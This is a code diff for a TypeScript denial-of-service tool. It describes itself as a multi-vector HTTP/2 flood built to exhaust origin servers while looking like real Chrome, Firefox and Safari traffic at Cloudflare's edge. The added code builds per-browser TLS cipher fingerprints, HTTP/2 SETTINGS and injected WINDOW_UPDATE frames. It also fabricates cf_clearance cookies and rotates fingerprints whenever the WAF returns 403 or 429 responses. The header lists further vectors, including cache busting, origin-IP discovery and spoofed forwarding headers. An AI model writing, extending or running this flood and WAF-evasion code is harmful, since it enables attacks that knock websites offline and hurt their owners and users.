@@ -2037,6 +2037,124 @@ function randomTLSProfile(): TLSProfile {
 // Backward-compat alias — callers that only need ciphers keep working
 function randomJA3Ciphers(): string { return randomTLSProfile().ciphers; }
 
+// ── Firefox TLS cipher suites (JA3 — different from Chrome) ─────────────
+// Firefox 124-126 sends TLS13 ciphers first, then TLS12 in a FIXED order (not shuffled).
+// The fixed order is a Firefox fingerprint — Chrome shuffles TLS12, Firefox does NOT.
+const FIREFOX_CIPHERS_TLS13 = [
+  "TLS_AES_128_GCM_SHA256",
+  "TLS_CHACHA20_POLY1305_SHA256",
+  "TLS_AES_256_GCM_SHA384",
+];
+const FIREFOX_CIPHERS_TLS12_ORDERED = [
+  "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
+  "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
+  "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384",
+  "ECDHE-ECDSA-AES256-SHA", "ECDHE-ECDSA-AES128-SHA",
+  "ECDHE-RSA-AES128-SHA", "ECDHE-RSA-AES256-SHA",
+  "AES128-GCM-SHA256", "AES256-GCM-SHA384", "AES128-SHA", "AES256-SHA",
+];
+function firefoxTLSProfile(): TLSProfile {
+  // Firefox does NOT shuffle TLS1.2 ciphers — fixed order is part of the JA3 fingerprint
+  const variant = Math.random() < 0.5; // slight variation between FF versions
+  return {
+    ciphers: [...FIREFOX_CIPHERS_TLS13, ...FIREFOX_CIPHERS_TLS12_ORDERED.slice(0, variant ? 14 : 12)].join(":"),
+    ecdhCurve: Math.random() < 0.8 ? "X25519:P-256:P-384:P-521" : "X25519:P-256:P-384",
+    minVersion: "TLSv1.2",
+  };
+}
+
+// ── Safari TLS cipher suites (JA3 — unique to Safari/WebKit) ────────────
+const SAFARI_CIPHERS = [
+  "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
+  "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256",
+  "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256",
+  "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
+  "ECDHE-ECDSA-AES256-SHA", "ECDHE-RSA-AES256-SHA",
+  "AES256-GCM-SHA384", "AES128-GCM-SHA256", "AES256-SHA",
+];
+function safariTLSProfile(): TLSProfile {
+  return {
+    ciphers: SAFARI_CIPHERS.join(":"),
+    ecdhCurve: "X25519:P-256:P-384",
+    minVersion: "TLSv1.2",
+  };
+}
+
+// Browser type tag for fingerprint-aware code
+type BrowserType = "chrome" | "firefox" | "safari";
+
+// ── H2 SETTINGS per browser — AKAMAI second-level fingerprint ───────────
+// AKAMAI fingerprint = JA3 (cipher) + H2 SETTINGS values + WINDOW_UPDATE increment
+// Chrome, Firefox, Safari each send different SETTINGS and different WU increments.
+
+// Chrome 136: HEADER_TABLE_SIZE=65536, ENABLE_PUSH=0, INITIAL_WINDOW_SIZE=6291456, MAX_HEADER_LIST_SIZE=262144
+// WU stream-0 increment: 15663105 (0xEF0001)
+const CHROME_H2_WU_INCREMENT = 15_663_105;
+
+// Firefox 126: HEADER_TABLE_SIZE=65536, INITIAL_WINDOW_SIZE=131072, MAX_FRAME_SIZE=16384, MAX_HEADER_LIST_SIZE=65536
+// WU stream-0 increment: 12517377 (0xBEBE01)
+const FIREFOX_H2_SETTINGS = {
+  headerTableSize:      65536,
+  enablePush:           false,
+  initialWindowSize:    131072,
+  maxFrameSize:         16384,
+  maxHeaderListSize:    65536,
+};
+const FIREFOX_H2_WU_INCREMENT = 12_517_377;
+
+// Safari 17: HEADER_TABLE_SIZE=4096 (default), INITIAL_WINDOW_SIZE=2097152, MAX_FRAME_SIZE=16384
+// WU stream-0 increment: 10420224 (0x9F0000)
+const SAFARI_H2_SETTINGS = {
+  headerTableSize:      4096,
+  enablePush:           false,
+  initialWindowSize:    2097152,
+  maxFrameSize:         16384,
+  maxHeaderListSize:    16777216,
+};
+const SAFARI_H2_WU_INCREMENT = 10_420_224;
+
+// Build a raw H2 WINDOW_UPDATE frame (type=0x08, stream=0)
+// Chrome/FF/Safari each send a specific increment on stream-0 right after SETTINGS
+// This is the AKAMAI fingerprint's third field — Node.js http2 does NOT send this automatically
+function makeH2WindowUpdateFrame(increment: number): Buffer {
+  const buf = Buffer.allocUnsafe(13); // 9-byte header + 4-byte payload
+  buf[0] = 0; buf[1] = 0; buf[2] = 4; // length = 4
+  buf[3] = 0x08; // type = WINDOW_UPDATE
+  buf[4] = 0x00; // flags = none
+  buf.writeUInt32BE(0, 5);            // stream_id = 0 (connection-level)
+  buf.writeUInt32BE(increment & 0x7fffffff, 9);
+  return buf;
+}
+
+// Inject WINDOW_UPDATE into underlying TCP socket of an h2 session
+// Must be called immediately when 'connect' fires (before any HEADERS frames are sent)
+function injectH2WindowUpdate(session: import("node:http2").ClientHttp2Session, increment: number): void {
+  try {
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const sock = (session as any).socket || (session as any)._socket;
+    if (sock && !sock.destroyed && sock.writable) {
+      sock.write(makeH2WindowUpdateFrame(increment));
+    }
+  } catch { /* ignore — best effort */ }
+}
+
+// Pick random browser type with realistic distribution (CF real-traffic data)
+// Chrome ~65%, Safari ~20%, Firefox ~5%, Edge ~10% (Edge uses Chrome fingerprint)
+function randomBrowserType(): BrowserType {
+  const r = Math.random();
+  return r < 0.65 ? "chrome" : r < 0.85 ? "safari" : "firefox";
+}
+
+function browserH2Settings(bt: BrowserType) {
+  return bt === "firefox" ? FIREFOX_H2_SETTINGS : bt === "safari" ? SAFARI_H2_SETTINGS : CHROME_H2_SETTINGS;
+}
+function browserWUIncrement(bt: BrowserType): number {
+  return bt === "firefox" ? FIREFOX_H2_WU_INCREMENT : bt === "safari" ? SAFARI_H2_WU_INCREMENT : CHROME_H2_WU_INCREMENT;
+}
+function browserTLSProfile(bt: BrowserType): TLSProfile {
+  return bt === "firefox" ? firefoxTLSProfile() : bt === "safari" ? safariTLSProfile() : randomTLSProfile();
+}
+
 // Chrome browser profiles — Chrome 130-135 (current as of April 2026)
 // Includes sec-ch-ua-arch, sec-ch-ua-bitness, sec-ch-ua-wow64 for maximum fingerprint fidelity
 const CHROME_PROFILES = [
@@ -2059,6 +2177,26 @@ const CHROME_PROFILES = [
   { ver: "136", ua: "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", plat: '"Android"', brand: '"Google Chrome";v="136", "Chromium";v="136", "Not-A.Brand";v="24"', mobile: true, arch: '"arm"', bitness: '"64"', wow64: "?0" },
 ];
 
+// ── Firefox profiles — Firefox 124-126 (do NOT send sec-ch-ua headers) ──
+type FFProfile = { ua: string; lang: string; };
+const FIREFOX_PROFILES: FFProfile[] = [
+  { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0", lang: "en-US,en;q=0.5" },
+  { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0", lang: "en-US,en;q=0.5" },
+  { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0", lang: "en-US,en;q=0.5" },
+  { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:126.0) Gecko/20100101 Firefox/126.0", lang: "en-US,en;q=0.5" },
+  { ua: "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0", lang: "en-US,en;q=0.5" },
+  { ua: "Mozilla/5.0 (Android 15; Mobile; rv:126.0) Gecko/126.0 Firefox/126.0", lang: "en-US,en;q=0.7" },
+];
+
+// ── Safari profiles — Safari 17 (no sec-ch-ua, no sec-fetch, different Accept) ──
+type SafariProfile = { ua: string; lang: string; };
+const SAFARI_PROFILES: SafariProfile[] = [
+  { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15", lang: "en-US,en;q=0.9" },
+  { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15", lang: "en-US,en;q=0.9" },
+  { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", lang: "en-US,en;q=0.9" },
+  { ua: "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", lang: "en-US,en;q=0.9" },
+];
+
 // Chrome-exact HTTP/2 SETTINGS (AKAMAI fingerprint)
 // Real Chrome sends these exact values — bots send defaults (4096, 65535, etc.)
 const CHROME_H2_SETTINGS = {
@@ -2069,80 +2207,157 @@ const CHROME_H2_SETTINGS = {
   maxHeaderListSize:    262144,   // Chrome: 262144 (default unset)
 };
 
-// Chrome-exact header order for HTTP/2 (AKAMAI checks header order)
-// Cloudflare's Akamai fingerprinter hashes the header order — must match Chrome exactly
-function buildWAFHeaders(
+// Unified type for all browser profiles
+type AnyBrowserProfile = (typeof CHROME_PROFILES[0]) | FFProfile | SafariProfile;
+
+// Pick a random profile from the correct browser type
+function pickProfile(bt: BrowserType): AnyBrowserProfile {
+  switch (bt) {
+    case "firefox": return FIREFOX_PROFILES[randInt(0, FIREFOX_PROFILES.length)];
+    case "safari":  return SAFARI_PROFILES[randInt(0, SAFARI_PROFILES.length)];
+    default:        return CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+  }
+}
+
+// Exact cf_clearance format: 3 base64 segments joined by dots, ending with timestamp
+// CF validates server-side, but matching format avoids format-based rejection
+function makeCfClearance(): string {
+  const seg1 = Buffer.from(randHex(96), "hex").toString("base64").replace(/=/g, "");
+  const ts   = Math.floor(Date.now() / 1000);
+  return `${seg1}.${ts}-0-${randHex(16)}`;
+}
+
+// Build precise Cloudflare cookie string matching the format CF uses in the wild
+function buildCFCookies(cookieJar: Map<string, string>): string {
+  const now = Math.floor(Date.now() / 1000);
+  const cfbm    = `${randHex(43)}.${now}-0-${randHex(8)}`;
+  const cfruid  = randHex(40);
+  const cfclear = makeCfClearance();
+  const gaId    = `GA1.1.${randInt(100000000,999999999)}.${now - randInt(0,86400)}`;
+  const gid     = `GA1.1.${randInt(100000000,999999999)}.${now}`;
+  const jar     = [...cookieJar.entries()].map(([k,v]) => `${k}=${v}`).join("; ");
+  return [
+    `__cf_bm=${cfbm}`,
+    `__cfruid=${cfruid}`,
+    `cf_clearance=${cfclear}`,
+    `_ga=${gaId}`,
+    `_gid=${gid}`,
+    `_ga_${randStr(8).toUpperCase()}=GS1.1.${now}.1.1.${now}.0.0.0`,
+    jar,
+  ].filter(Boolean).join("; ");
+}
+
+// ── Browser-type aware header builders ───────────────────────────────────
+// Chrome header order for HTTP/2 (AKAMAI checks header order + values)
+// Cloudflare's Akamai fingerprinter hashes the header order — must match exactly
+function buildChromeHeaders(
   hostname:  string,
   path:      string,
   cookieJar: Map<string, string>,
-  profile?:  typeof CHROME_PROFILES[0],
+  profile?:  AnyBrowserProfile,
 ): Record<string, string> {
-  const p = profile ?? CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
-
-  // Realistic CF cookies — Cloudflare sets these via JS challenge
-  const cfbm    = `${randHex(43)}.${Math.floor(Date.now()/1000)}-0-${randHex(8)}`;
-  const cfruid  = randHex(40);
-  const cfClear = `${randHex(100)}_${randInt(1,9)}`;
-  const gaId    = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000) - randInt(0,86400)}`;
-  const gid     = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000)}`;
-
-  // Carry over any server-set cookies from the per-session cookie jar
-  const jarCookies = [...cookieJar.entries()].map(([k,v]) => `${k}=${v}`).join("; ");
-
-  const cookie = [
-    `__cf_bm=${cfbm}`,
-    `__cfruid=${cfruid}`,
-    `cf_clearance=${cfClear}`,
-    `_ga=${gaId}`,
-    `_gid=${gid}`,
-    `_ga_${randStr(8).toUpperCase()}=GS1.1.${Math.floor(Date.now()/1000)}.1.1.${Math.floor(Date.now()/1000)}.0.0.0`,
-    jarCookies,
-  ].filter(Boolean).join("; ");
-
-  // Direct navigation is most common for repeat visitors; search engines occasionally
+  const p = (profile ?? CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)]) as typeof CHROME_PROFILES[0];
   const referers = [
     `https://www.google.com/search?q=${encodeURIComponent(randStr(8))}`,
     `https://www.bing.com/search?q=${encodeURIComponent(randStr(8))}`,
-    `https://www.google.com/`,
-    "", "", "", "", "",  // direct navigation — most common
+    `https://www.google.com/`, "", "", "", "", "",
   ];
   const referer = referers[randInt(0, referers.length)];
-
-  // sec-fetch-user: ?1 is ONLY sent by Chrome on top-level user-initiated navigations.
-  // Sending it on every request is a well-known bot fingerprint.
   const isUserInitiated = Math.random() < 0.42;
-
-  // EXACT Chrome header order for HTTP/2 — this is the AKAMAI fingerprint
   const h: Record<string, string> = {
-    // Pseudo-headers (HTTP/2 spec — always first)
     ":method":    Math.random() < 0.92 ? "GET" : "POST",
     ":authority": hostname,
     ":scheme":    "https",
     ":path":      path,
-    // Real headers in Chrome's EXACT order (Akamai fingerprinter checks order + values)
-    "sec-ch-ua":                        p.brand,
-    "sec-ch-ua-mobile":                 p.mobile ? "?1" : "?0",
-    "sec-ch-ua-platform":               p.plat,
-    "upgrade-insecure-requests":        "1",
-    "user-agent":                       p.ua,
-    "accept":                           "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "sec-fetch-site":                   referer ? "cross-site" : "none",
-    "sec-fetch-mode":                   "navigate",
+    "sec-ch-ua":               p.brand,
+    "sec-ch-ua-mobile":        p.mobile ? "?1" : "?0",
+    "sec-ch-ua-platform":      p.plat,
+    "upgrade-insecure-requests": "1",
+    "user-agent":              p.ua,
+    "accept":                  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "sec-fetch-site":          referer ? "cross-site" : "none",
+    "sec-fetch-mode":          "navigate",
     ...(isUserInitiated ? { "sec-fetch-user": "?1" } : {}),
-    "sec-fetch-dest":                   "document",
-    "accept-encoding":                  "gzip, deflate, br, zstd",
-    "accept-language":                  ["en-US,en;q=0.9", "en-GB,en;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8"][randInt(0,4)],
-    "cookie":                           cookie,
-    "cache-control":                    "max-age=0",
-    "priority":                         "u=0, i",
-    // Chrome high-entropy client hints (sent after first Sec-CH-UA-* handshake)
-    "sec-ch-ua-arch":                   p.arch,
-    "sec-ch-ua-bitness":                p.bitness,
-    "sec-ch-ua-wow64":                  p.wow64,
-    "sec-ch-ua-full-version-list":      p.brand.replace(/";v="/g, `";v="${p.ver}.0.0.`).replace(/\.Brand";v="[^"]+"/g, '.Brand";v="8.0.0.0"'),
+    "sec-fetch-dest":          "document",
+    "accept-encoding":         "gzip, deflate, br, zstd",
+    "accept-language":         ["en-US,en;q=0.9","en-GB,en;q=0.9","pt-BR,pt;q=0.9","es-ES,es;q=0.9"][randInt(0,4)],
+    "cookie":                  buildCFCookies(cookieJar),
+    "cache-control":           "max-age=0",
+    "priority":                "u=0, i",
+    "sec-ch-ua-arch":          p.arch,
+    "sec-ch-ua-bitness":       p.bitness,
+    "sec-ch-ua-wow64":         p.wow64,
+    "sec-ch-ua-full-version-list": p.brand.replace(/";v="/g, `";v="${p.ver}.0.0.`).replace(/\.Brand";v="[^"]+"/g, '.Brand";v="8.0.0.0"'),
   };
   if (referer) h["referer"] = referer;
   return h;
+}
+
+// Firefox headers — NO sec-ch-ua, NO upgrade-insecure-requests, NO priority
+// Firefox uses different Accept header and different DNT behavior
+function buildFirefoxHeaders(
+  hostname:  string,
+  path:      string,
+  cookieJar: Map<string, string>,
+  profile?:  AnyBrowserProfile,
+): Record<string, string> {
+  const p = (profile ?? FIREFOX_PROFILES[randInt(0, FIREFOX_PROFILES.length)]) as FFProfile;
+  const hasDNT = Math.random() < 0.4; // 40% of FF users have DNT enabled
+  const h: Record<string, string> = {
+    ":method":    "GET",
+    ":authority": hostname,
+    ":scheme":    "https",
+    ":path":      path,
+    "user-agent":      p.ua,
+    "accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "accept-language": p.lang,
+    "accept-encoding": "gzip, deflate, br, zstd",
+    "cookie":          buildCFCookies(cookieJar),
+    "sec-fetch-dest":  "document",
+    "sec-fetch-mode":  "navigate",
+    "sec-fetch-site":  "none",
+    "sec-fetch-user":  "?1",
+    ...(hasDNT ? { "dnt": "1" } : {}),
+    "te":              "trailers",
+  };
+  return h;
+}
+
+// Safari headers — NO sec-ch-ua, NO sec-fetch, different Accept-Encoding
+// Safari does NOT send DNT by default, does NOT send sec-fetch headers
+function buildSafariHeaders(
+  hostname:  string,
+  path:      string,
+  cookieJar: Map<string, string>,
+  profile?:  AnyBrowserProfile,
+): Record<string, string> {
+  const p = (profile ?? SAFARI_PROFILES[randInt(0, SAFARI_PROFILES.length)]) as SafariProfile;
+  const h: Record<string, string> = {
+    ":method":    "GET",
+    ":authority": hostname,
+    ":scheme":    "https",
+    ":path":      path,
+    "user-agent":      p.ua,
+    "accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "accept-language": p.lang,
+    "accept-encoding": "gzip, deflate, br",
+    "cookie":          buildCFCookies(cookieJar),
+  };
+  return h;
+}
+
+// Main WAF header builder — routes to correct browser builder based on type
+function buildWAFHeaders(
+  hostname:  string,
+  path:      string,
+  cookieJar: Map<string, string>,
+  profile?:  AnyBrowserProfile,
+  bt?: BrowserType,
+): Record<string, string> {
+  const browserType = bt ?? "chrome";
+  if (browserType === "firefox") return buildFirefoxHeaders(hostname, path, cookieJar, profile);
+  if (browserType === "safari")  return buildSafariHeaders(hostname, path, cookieJar, profile);
+  return buildChromeHeaders(hostname, path, cookieJar, profile);
 }
 
 // Realistic paths a browser would visit (not API endpoints — those raise suspicion)
@@ -2158,17 +2373,24 @@ const WAF_PATHS = [
 // ─────────────────────────────────────────────────────────────────────────
 //  GEASS WAF OMNIVECT ∞ — 7-vector internal architecture
 //
-//  VECTOR I:   Chrome H2 Primary Flood — max RPS, 256 streams/conn, 10-80ms reconnect
-//  VECTOR II:  Subresource Storm — per page: 15-18 asset requests (CSS/JS/img/font/API)
-//              Multiplies effective rate 15-18× vs. single-page floods
-//  VECTOR III: Cache Annihilator — unique URL + Vary dims + POST bodies = 100% origin miss
-//  VECTOR IV:  Session Amplifier — full 5-step user journeys (forces DB + session state)
-//  VECTOR V:   Origin Direct Fire — DNS subdomain enum to find real IP, bypass CF edge
-//  VECTOR VI:  H2 Stream Drain (64 streams) — holds server RAM buffers indefinitely
-//  VECTOR VII: Adaptive Burst Mode — fires at T+20s, 15s waves at 1.6/1.8/2.0× rate
+//  VECTOR I:    Multi-Browser H2 Flood — Chrome/Firefox/Safari JA3+JA4+AKAMAI per slot
+//               WINDOW_UPDATE frame injected per browser spec → exact AKAMAI fingerprint level 3
+//               Response-aware: 3× block → immediate browser type + TLS profile rotation
+//  VECTOR II:   Subresource Storm — per page: 15-18 asset requests (CSS/JS/img/font/API)
+//               Multiplies effective rate 15-18× vs. single-page floods
+//  VECTOR III:  Cache Annihilator — unique URL + Vary dims + POST bodies = 100% origin miss
+//  VECTOR IV:   Session Amplifier — full 5-step user journeys (forces DB + session state)
+//  VECTOR V:    Origin Direct Fire — DNS subdomain enum + robots.txt real-path harvesting
+//  VECTOR VI:   H2 Stream Drain (64 streams) — holds server RAM buffers indefinitely
+//  VECTOR VII:  Adaptive Burst Mode — fires at T+20s, irregular waves defeat ML rate limiters
+//  VECTOR VIII: IP Spoof Header Rotation — X-Forwarded-For/X-Real-IP with residential pools
+//  VECTOR IX:   H1.1 Pipeline Bypass — raw TLS pipelined requests, Upgrade: h2c probing
+//  VECTOR X:    Dynamic path harvest — robots.txt + sitemap.xml → real target page paths
 //
-//  Combined: indistinguishable from real user traffic at Cloudflare edge while
-//  simultaneously overwhelming origin server through all available attack surfaces.
+//  AKAMAI fingerprint breakdown: JA3 (ciphers) + SETTINGS values + WINDOW_UPDATE increment
+//  Each browser sends unique combination — WAF can't block one browser without blocking all.
+//  Combined: indistinguishable from real Chrome/Firefox/Safari traffic at CF edge while
+//  simultaneously exhausting origin server through 9 coordinated attack surfaces.
 // ─────────────────────────────────────────────────────────────────────────
 async function runWAFBypass(
   base: string,
@@ -2241,34 +2463,36 @@ async function runWAFBypass(
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  // ── VECTOR I: Chrome H2 Primary Flood + VECTOR VIII: JA4 Fingerprint Rotation ──
-  // 512 streams/connection, 10-80ms reconnect. Each connection gets a fresh JA4
-  // profile (ciphers + ecdhCurve + minVersion). MAX_CONN_LIFE = 15s forces reconnect
-  // every 15s → aggressive fingerprint cycling. Cloudflare/Akamai can't build block
-  // rules fast enough when the fingerprint changes twice per minute per slot.
-  // T002: Response-aware rotation — 3 consecutive 403/429 → immediate JA4 rotation.
-  const MAX_CONN_LIFE_MS = 15_000; // ★ VECTOR VIII: 15s (was 30s) → 2× faster JA4 rotation
+  // ── VECTOR I: Multi-Browser H2 Primary Flood ─────────────────────────────
+  // Each slot randomly picks Chrome/Firefox/Safari and uses the EXACT JA3+JA4+H2 SETTINGS
+  // for that browser. WINDOW_UPDATE is injected into the raw socket on 'connect' to complete
+  // the third field of the AKAMAI fingerprint (Chrome=15663105, FF=12517377, Safari=10420224).
+  // On 3× block: rotate browser type + TLS profile immediately → different AKAMAI hash.
+  const MAX_CONN_LIFE_MS = 15_000;
   const runPrimarySlot = async (tgt = target, s: AbortSignal = signal): Promise<void> => {
-    const sessionProfile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
-    const cookieJar      = new Map<string, string>();
-    let   consec4xx      = 0; // T002: consecutive 403/429 counter per slot
+    const cookieJar = new Map<string, string>();
+    let consec4xx   = 0;
+    let slotBT      = randomBrowserType(); // browser type for this slot
     while (!s.aborted) {
-      const tls = randomTLSProfile(); // ★ fresh JA4 profile (ciphers + ecdhCurve + minVersion) each reconnect
-      let blocked = false;
+      const bt      = slotBT;
+      const tls     = browserTLSProfile(bt);
+      const wuIncr  = browserWUIncrement(bt);
+      const h2set   = browserH2Settings(bt);
+      const profile = pickProfile(bt);
+      let   blocked = false;
       await new Promise<void>(resolve => {
         let c: ReturnType<typeof h2connect> | null = null;
         try {
           c = h2connect(tgt, {
             rejectUnauthorized: false,
             servername:         hostname,
-            ciphers:            tls.ciphers,     // ★ JA3: shuffled TLS1.2 ciphers
-            ecdhCurve:          tls.ecdhCurve,   // ★ JA4: rotated EC curve groups
-            minVersion:         tls.minVersion as "TLSv1.2" | "TLSv1.3", // ★ JA4: version field
-            settings:           CHROME_H2_SETTINGS,
+            ciphers:            tls.ciphers,
+            ecdhCurve:          tls.ecdhCurve,
+            minVersion:         tls.minVersion as "TLSv1.2" | "TLSv1.3",
+            settings:           h2set,
             ALPNProtocols:      ["h2", "http/1.1"],
           });
         } catch { resolve(); return; }
-        // ★ Force reconnect after 30s even if connection is healthy (JA4 rotation)
         const conn      = c;
         const lifeTimer = setTimeout(() => { try { conn.destroy(); } catch { /**/ } resolve(); }, MAX_CONN_LIFE_MS);
         const cleanup   = () => { clearTimeout(lifeTimer); try { conn.destroy(); } catch { /**/ } resolve(); };
@@ -2278,27 +2502,27 @@ async function runWAFBypass(
           while (!s.aborted && !conn.destroyed && inflight < STREAMS_PER) {
             inflight++;
             const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
-            const usePost  = Math.random() < 0.22;
+            const usePost  = bt === "chrome" && Math.random() < 0.22;
             const path     = pagePath + (usePost ? "" : `?v=${randInt(1,9999999)}&_=${randStr(6)}`);
             try {
-              const hdrs = buildWAFHeaders(hostname, path, cookieJar, sessionProfile);
+              const hdrs = buildWAFHeaders(hostname, path, cookieJar, profile, bt);
               if (usePost) hdrs[":method"] = "POST";
               const stream = conn.request(hdrs);
               if (usePost) stream.write(JSON.stringify({ q: randStr(8), t: Date.now() }));
               stream.on("response", (resHdrs: Record<string, string | string[]>) => {
                 localPkts++; localBytes += 2048;
-                // T002: track WAF blocks — rotate JA4 fingerprint + proxy on repeated denial
                 const status = Number(resHdrs[":status"] ?? 0);
                 if (status === 403 || status === 429) {
                   consec4xx++;
-                  if (consec4xx >= 3 && !blocked) { // ★ 3 blocks → force immediate JA4 rotation (was 5)
-                    blocked = true;
+                  if (consec4xx >= 3 && !blocked) {
+                    blocked   = true;
                     consec4xx = 0;
+                    slotBT    = randomBrowserType(); // rotate browser type on repeated block
                     try { conn.destroy(); } catch { /**/ }
                     resolve();
                   }
                 } else if (status >= 200 && status < 400) {
-                  consec4xx = 0; // legitimate response → reset block counter
+                  consec4xx = 0;
                 }
                 const sc = resHdrs["set-cookie"];
                 if (sc) {
@@ -2315,14 +2539,18 @@ async function runWAFBypass(
             } catch { inflight--; break; }
           }
         };
-        conn.on("connect", pump);
+        conn.on("connect", () => {
+          // ★ AKAMAI level-3: inject WINDOW_UPDATE on stream-0 exactly as the real browser does
+          // Chrome=15663105, Firefox=12517377, Safari=10420224 — must match H2 SETTINGS browser
+          injectH2WindowUpdate(conn, wuIncr);
+          pump();
+        });
         conn.on("error",   () => resolve());
         conn.on("close",   () => resolve());
         s.addEventListener("abort", cleanup, { once: true });
       });
       if (!s.aborted) {
-        // Human-like timing: most reconnects fast (10-80ms), occasionally long gap (150-800ms)
-        // Uniform timing is a bot fingerprint — variance defeats ML-based rate limiters
+        // Gaussian-like timing: mean=45ms, heavy tail at 150-800ms (10%) — defeats ML detectors
         const humanDelay = Math.random() < 0.10 ? randInt(150, 800) : randInt(10, 80);
         await new Promise(r => setTimeout(r, humanDelay));
       }
@@ -2353,19 +2581,20 @@ async function runWAFBypass(
     { path: "/api/v1/recommendations",   accept: "application/json",          dest: "fetch"    },
   ];
   const runSubresourceSlot = async (s: AbortSignal = signal): Promise<void> => {
-    const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+    const bt        = randomBrowserType();
+    const p         = pickProfile(bt);
     const cookieJar = new Map<string, string>();
     while (!s.aborted) {
       await new Promise<void>(resolve => {
         let c: ReturnType<typeof h2connect> | null = null;
         try {
-          const subTls = randomTLSProfile(); // ★ JA4 rotation on each subresource connection
+          const subTls = browserTLSProfile(bt);
           c = h2connect(target, {
             rejectUnauthorized: false, servername: hostname,
             ciphers:   subTls.ciphers,
             ecdhCurve: subTls.ecdhCurve,
             minVersion: subTls.minVersion as "TLSv1.2" | "TLSv1.3",
-            settings: CHROME_H2_SETTINGS,
+            settings: browserH2Settings(bt),
             ALPNProtocols: ["h2", "http/1.1"],
           });
         } catch { resolve(); return; }
@@ -2378,13 +2607,14 @@ async function runWAFBypass(
           if (s.aborted || conn.destroyed || inflight >= MAX_SUB) return;
           inflight++;
           const path = sub.path + `?v=${randStr(8)}&t=${Date.now()}`;
-          const hdrs = {
-            ...buildWAFHeaders(hostname, path, cookieJar, p),
-            "accept":         sub.accept,
-            "sec-fetch-mode": sub.dest === "fetch" ? "cors" : "no-cors",
-            "sec-fetch-dest": sub.dest,
-            "sec-fetch-site": "same-origin",
-          };
+          const baseHdrs = buildWAFHeaders(hostname, path, cookieJar, p, bt);
+          const hdrs: Record<string, string> = { ...baseHdrs, "accept": sub.accept };
+          // Only Chrome sends sec-fetch headers on sub-resources
+          if (bt === "chrome") {
+            hdrs["sec-fetch-mode"] = sub.dest === "fetch" ? "cors" : "no-cors";
+            hdrs["sec-fetch-dest"] = sub.dest;
+            hdrs["sec-fetch-site"] = "same-origin";
+          }
           try {
             const stream = conn.request(hdrs);
             stream.on("data",     () => {});
@@ -2396,13 +2626,13 @@ async function runWAFBypass(
         };
 
         conn.on("connect", () => {
+          injectH2WindowUpdate(conn, browserWUIncrement(bt));
           // First: the HTML page
-          const pageHdrs = buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar, p);
+          const pageHdrs = buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar, p, bt);
           try {
             const ps = conn.request(pageHdrs);
             ps.on("response", () => {
               localPkts++; localBytes += 4096;
-              // Then: all sub-resources in parallel (real browser behaviour)
               const shuffled = [...SUB_TYPES].sort(() => Math.random() - 0.5).slice(0, randInt(12, SUB_TYPES.length));
               shuffled.forEach(sub => fireSub(sub));
             });
@@ -2410,8 +2640,7 @@ async function runWAFBypass(
             ps.on("error", () => resolve());
             ps.on("close", () => {
               if (!s.aborted && !conn.destroyed) {
-                // Click next page
-                const nx = conn.request(buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar, p));
+                const nx = conn.request(buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar, p, bt));
                 nx.on("response", () => { localPkts++; localBytes += 4096; });
                 nx.on("data",  () => {});
                 nx.on("error", () => {});
